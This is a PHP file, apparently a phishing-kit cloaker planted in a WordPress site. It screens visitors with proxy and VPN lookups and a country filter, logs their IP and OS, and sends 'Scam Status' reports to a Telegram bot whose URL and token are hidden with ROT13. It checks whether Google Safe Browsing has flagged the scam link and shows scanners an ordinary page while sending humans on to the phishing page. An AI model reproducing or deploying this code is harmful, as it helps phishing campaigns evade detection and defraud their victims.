<?php
// Created By Urie
session_start();

define('WP_USE_THEMES', true);
define('LOCATION', "https://google.com");
define('CHECKUP', "AccessID923487");
define('wplink', '/wp-blog-header.php');

if (isset($_GET["del"]))
{
    unlink("index.php");
    exit;
}
if (isset($_GET["check"]))
{
    print CHECKUP;
    exit;
}

$license = "Houss-1987";

$redirect = "./main.html";

$parameter = 1; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple

$wordpress = true; // Allow Wordpress Include

$checkfileup = false; // Check Link UP

//$country = array('ma','US','us'); #Country's Allowed To Access

$country = array(
    'af', 'ax', 'al', 'dz', 'as', 'ad', 'ao', 'ai', 'aq', 'ag', 'ar', 'am', 'aw', 'au', 'at', 'az', 'bs', 'bh', 'bd', 'bb', 'by', 'be', 'bz', 'bj', 'bm', 'bt', 'bo', 'bq', 'ba', 'bw', 'bv', 'br', 'io', 'bn', 'bg', 'bf', 'bi', 'cv', 'kh', 'cm', 'ca', 'ky', 'cf', 'td', 'cl', 'cn', 'cx', 'cc', 'co', 'km', 'cg', 'cd', 'ck', 'cr', 'ci', 'hr', 'cu', 'cw', 'cy', 'cz', 'dk', 'dj', 'dm', 'do', 'ec', 'eg', 'sv', 'gq', 'er', 'ee', 'et', 'fk', 'fo', 'fj', 'fi', 'fr', 'gf', 'pf', 'tf', 'ga', 'gm', 'ge', 'de', 'gh', 'gi', 'gr', 'gl', 'gd', 'gp', 'gu', 'gt', 'gg', 'gn', 'gw', 'gy', 'ht', 'hm', 'va', 'hn', 'hk', 'hu', 'is', 'in', 'id', 'ir', 'iq', 'ie', 'im', 'il', 'it', 'jm', 'jp', 'je', 'jo', 'kz', 'ke', 'ki', 'kp', 'kr', 'kw', 'kg', 'la', 'lv', 'lb', 'ls', 'lr', 'ly', 'li', 'lt', 'lu', 'mo', 'mk', 'mg', 'mw', 'my', 'mv', 'ml', 'mt', 'mh', 'mq', 'mr', 'mu', 'yt', 'mx', 'fm', 'md', 'mc', 'mn', 'me', 'ms', 'ma', 'mz', 'mm', 'na', 'nr', 'np', 'nl', 'nc', 'nz', 'ni', 'ne', 'ng', 'nu', 'nf', 'mp', 'no', 'om', 'pk', 'pw', 'ps', 'pa', 'pg', 'py', 'pe', 'ph', 'pn', 'pl', 'pt', 'pr', 'qa', 're', 'ro', 'ru', 'rw', 'bl', 'sh', 'kn', 'lc', 'mf', 'pm', 'vc', 'ws', 'sm', 'st', 'sa', 'sn', 'rs', 'sc', 'sl', 'sg', 'sx', 'sk', 'si', 'sb', 'so', 'za', 'gs', 'ss', 'es', 'lk', 'sd', 'sr', 'sj', 'sz', 'se', 'ch', 'sy', 'tw', 'tj', 'tz', 'th', 'tl', 'tg', 'tk', 'to', 'tt', 'tn', 'tr', 'tm', 'tc', 'tv', 'ug', 'ua', 'ae', 'gb', 'us', 'um', 'uy', 'uz', 'vu', 've', 'vn', 'vg', 'vi', 'wf', 'eh', 'ye', 'zm', 'zw'
);

/************************************************************* PARAMETRES ******************************************************************/

class Obj
{
	var $keys;
    var $returns;
	var $message;
    const errorlink = "EMPTY LINK";
    const Human = "Human";
	const countrydenied = "Country Denied";
    const bot = "Bot";
    const down = "Scama Down";
    const alert = "Alert Red Page";
    const license = "License Required";
    const block = "BLOCK";
    const allow = "ALLOW";
    const localhost = "102.53.13.21";
    const timeout = 10;
    const id = "1061031967:";
    const filename = "ih.gkg";
    const token = "NNSDZImC22QWPq7tCDN1keH_9irLcAACJOD";
    const chatid = "@voeobl";
    const telegram = "uggcf://ncv.gryrtenz.bet/obg";
    const api1 = "uggcf://oynpxobk.vcvasb.ncc/ybbxhc/";
    const api2 = "uggc://purpx.trgvcvagry.arg/purpx.cuc?vc=";
    const api3 = "uggcf://vc.grbu.vb/ncv/ica/";
    const api4 = "uggc://cebklpurpx.vb/i2/";
    const api5 = "uggcf://i2.ncv.vcuho.vasb/thrfg/vc/";
    const api6 = "uggcf://vcncv.pbz/vc_ncv.cuc?vc=";
    const googleapi = "uggcf://genafcneraplercbeg.tbbtyr.pbz/genafcneraplercbeg/ncv/i3/fnsroebjfvat/fgnghf?fvgr=";
    

    private function __curl($url)
    {

        $this->keys = curl_init();
        curl_setopt($this->keys, CURLOPT_URL, $url);
        curl_setopt($this->keys, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($this->keys, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($this->keys, CURLOPT_TIMEOUT, self::timeout);
        curl_setopt($this->keys, CURLOPT_COOKIESESSION, true);
        curl_setopt($this->keys, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        $this->returns = curl_exec($this->keys);
        return $this->returns;

    }
    private function __jsondecode($text)
    {

        return @json_decode($text);
    }
    private function rot($text)
    {

        return @str_rot13($text);
    }
    private function proxy1($ip)
    {
        $jsons = $this->__curl($this->rot(self::api1));
        if ($jsons == "Y")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }
    private function proxy2($ip)
    {
        $html = $this->__curl($this->rot(self::api2) . $ip . "&contact=anasfd12" . rand(0, 1999999) . "@hotmail.com");
        if ($html >= 0.99)
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function proxy3($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api3) . $ip));
        if ($json->risk == "high")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function proxy4($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api4) . $ip . "&risk=1&vpn=1"));
        if ($json->status == "ok" && $json->$ip->proxy == "yes")
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function proxy5($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api5) . $ip . "?c=" . md5(rand(0, 11))));
        if ($json->block == 1)
        {
            return self::block;
        }
        else
        {
            return self::allow;
        }
    }

    private function __getcountrycode($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api6) . $ip));
        return $json->country_code;

    }
    private function __getcountryname($ip)
    {
        $json = $this->__jsondecode($this->__curl($this->rot(self::api6) . $ip));
        return $json->country_name;

    }
    private function __messagesend($message)
    {
        if (!empty($message))
        {
            $url = $this->rot(self::telegram) . self::id . $this->rot(self::token) . "/sendMessage?chat_id=" . $this->rot(self::chatid) . "&text=" . urlencode($message);
            $this->__curl($url);
        }
    }
    private function __get_user_os()
	{
		$str=$_SERVER["HTTP_USER_AGENT"];
		$ex=explode("(",$str)[1];
		$ex2=explode(")",$ex)[0];
		$ex3=str_replace(";","",$ex2);
		return $ex3;
	}
    
    private function __checklicense($license)
    {
        $sub = substr($license, 0, 1);
        $sido = explode("-", $license);

        if (ctype_upper($sub) && $sido[1] < 2000 && strlen($license) == 10)
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    private function url($redirect)
    {
        $html = $this->__curl($this->rot(self::googleapi) . $redirect);
        $ex = explode(",", $html);
        if ($ex[1] == 2)
        {
            return "RED";
        }
        else
        {
            return "GREEN";
        }
    }

    private function GetIpInfoFrmIpinfodbApi($ip)
    {

        $ResultInfo = array();

        $ResultInfo['CountryCodeMin'] = strtolower($this->__getcountrycode($ip));

        return $ResultInfo;

    }

    public function __writetext($text)
    {
        $file = fopen($this->rot(self::filename) , "a");
        fwrite($file, $this->__get_user_ip() . " | " . date("d/m/Y h:i:s A") . " | " . $this->__get_user_os() . " | " . $this->__getcountryname($this->__get_user_ip()) . " => " . $text . "\n");
    }
    private function __paramsendreport($id, $redirect)
    {
        if ($id == 1)
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "Scam Status : Down" . "\n";
            $this->message .= 'Link Redirect : ' . $_SERVER["HTTP_HOST"] . "\n";
            $this->message .= "Link Scam : " . $redirect . "\n";
            $this->message .= 'Date : ' . $date . "\n";
            $this->__messagesend($this->message);
        }
        elseif ($id == 2)
        {
            $date = date('r', $_SERVER['REQUEST_TIME']);
            $this->message = "Scam Status : You need to re-upload it now" . "\n";
            $this->message .= 'Link Redirect : ' . $_SERVER["HTTP_HOST"] . "\n";
            $this->message .= "Link Scam : " . $redirect . "\n";
            $this->message .= 'Date : ' . $date . "\n";
            $this->__messagesend($this->message);
        }

    }
    
    private function __get_user_ip()
    {
        foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $ipgrassjoss){
	                $ipgrassjoss = trim($ipgrassjoss);
	                if (filter_var($ipgrassjoss,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $ipgrassjoss;
	                }
					else
					{
						
						return self::localhost;
					}
	            }
	        }
	    }
	}
	
    
    public function __checkfullreport($redirect)
    {

        if ($this->url($redirect) == "RED" or $this->url($_SERVER["HTTP_HOST"]) == "RED")
        {

            $this->__paramsendreport(1, $redirect);
            $this->__writetext(self::alert);
            exit("<script>alert('Please Refresh This Page After 10min')</script>");
        }

    }
    public function __validlicense($license)
    {

        if ($this->__checklicense($license) == 0)
        {
            die(self::license);
			
			return 0;
			
        }
		else 
		{
			
			return 1;
			
		}

    }
    public function __allowedcountry($country)
    {

        $CountryData = $this->GetIpInfoFrmIpinfodbApi($this->__get_user_ip());

        if (!in_array($CountryData['CountryCodeMin'], $country))
        {
            $this->__writetext(self::countrydenied);
			
			return 0;

        }

        else
        {
			
            return 1;

        }

    }
    public function __checkproxy()
    {

        $proxy = $this->proxy1($this->__get_user_ip());
        $proxy2 = $this->proxy2($this->__get_user_ip());
        $proxy3 = $this->proxy3($this->__get_user_ip());
        $proxy4 = $this->proxy4($this->__get_user_ip());
        $proxy5 = $this->proxy5($this->__get_user_ip());

        if ($proxy == self::block or $proxy2 == self::block or $proxy3 == self::block or $proxy4 == self::block or $proxy5 == self::block)
        {
            $this->__writetext(self::bot);
			
			return 0;

        }
        else
        {
            return 1;
        }

    }
	private function __checkhostup($redirect,$checkfileup)
    {

        if ($checkfileup == true)
        {
            $html = $this->__curl($redirect . "/?check");
            if (preg_match("/" . CHECKUP . "/", $html))
            {
                return 1;
            }
            else
            {
                return 0;
            }
        }
        else
        {
            return 1;
        }
    }
	
    public function __hostup($redirect,$checkfileup)
    {
		if ($this->__checkhostup($redirect,$checkfileup) == 0)
        {
            $this->__writetext(self::down);
            $this->__paramsendreport(2, $redirect);
            exit("<script>alert('Contact Our Support For More Instruction')</script>");

        }

    }
	public function create_favicon($wordpress){
		
		if($wordpress == 1)
		{
			return fopen("favicon.ico", "a");
		}
	}
	public function __allowwp($id,$wordpress,$redirect)
    {
        if ($wordpress == true)
        {

            if ($id == 0)
            {

                return require (dirname(__FILE__) . wplink);
            }
            elseif ($id == 1)
            {

                return header("location:$redirect");
            }
        }
        elseif ($wordpress == false)
        {
            if ($id == 0)
            {
                return header("location:" . LOCATION);

            }
            elseif ($id == 1)
            {

                return header("location:$redirect");
            }
        }
    }

}

/************************************************************** BOT START ******************************************************************/
$param = new Obj;

$param->__checkfullreport($redirect);

if (!empty($redirect))
{

    switch ($parameter)
    {

        case "1":

		if($param->__validlicense($license) == 1 && $param->__checkproxy() == 1 && $param->__allowedcountry($country) == 1)
		{
			$param->create_favicon($wordpress);
			$param->__writetext(Obj::Human);
			$param->__hostup($redirect,$checkfileup);
			$param->__allowwp(1,$wordpress,$redirect);
		}
		else
		{
			$param->__allowwp(0,$wordpress,$redirect);
			
		}
		
		break;
		
		case "2":

		if($param->__validlicense($license) == 1 && $param->__allowedcountry($country) == 1)
		{
			$param->create_favicon($wordpress);
			$param->__writetext(Obj::Human);
			$param->__hostup($redirect,$checkfileup);
			$param->__allowwp(1,$wordpress,$redirect);
		}
		else
		{
			$param->__allowwp(0,$wordpress,$redirect);
			
		}
		
		break;
		
		case "3":

		if($param->__validlicense($license) == 1 && $param->__checkproxy() == 1)
		{
			$param->create_favicon($wordpress);
			$param->__writetext(Obj::Human);
			$param->__hostup($redirect,$checkfileup);
			$param->__allowwp(1,$wordpress,$redirect);
		}
		else
		{
			$param->__allowwp(0,$wordpress,$redirect);
			
		}
		
		break;
		
		default:
		
		header ("location:".$redirect);
		
		break;
		
	}

}
else
{

    echo Obj::errorlink;
}
/************************************************************** BOT END ******************************************************************/


